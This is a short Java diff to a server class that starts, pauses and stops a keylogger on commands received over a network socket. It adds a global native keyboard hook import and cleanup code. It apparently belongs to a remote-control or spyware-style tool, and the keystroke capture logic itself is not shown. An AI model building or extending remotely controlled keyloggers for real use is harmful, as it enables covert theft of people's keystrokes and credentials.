@@ -1,6 +1,7 @@
 package Server;
 
 import Function.KeyLogger;
+import com.github.kwhat.jnativehook.GlobalScreen;
 
 import java.net.ServerSocket;
 import java.net.Socket;
@@ -18,10 +19,14 @@ public class HandleKeyLogger implements Runnable, SendRecv {
                 option = SendRecv.getMess(s);
                 if (option.equals("Start")) {
                     kl.startKeyLog();
-                } else if (option.equals("Stop")) {
+                } else if (option.equals("Pause")) {
                     kl.stopKeyLogger();
                 }
             } while (!option.equals("Stop"));
+            if (kl.isStart) {
+                kl.stopKeyLogger();
+                GlobalScreen.unregisterNativeHook();
+            }
             s.close();
             ss.close();
         } catch (Exception e) {
